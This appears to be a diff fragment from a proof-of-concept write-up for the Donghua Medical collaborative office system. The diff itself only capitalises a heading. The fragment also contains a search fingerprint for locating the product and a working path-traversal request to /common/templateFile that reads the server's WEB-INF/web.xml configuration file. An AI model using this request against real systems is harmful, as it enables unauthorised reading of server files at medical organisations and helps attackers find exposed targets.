@@ -8,7 +8,7 @@
 body="东华医疗协同办公系统"
 ```
 
-## poc
+## POC
 
 ```java
 GET /common/templateFile?template_name=../../WEB-INF/web.xml HTTP/1.1
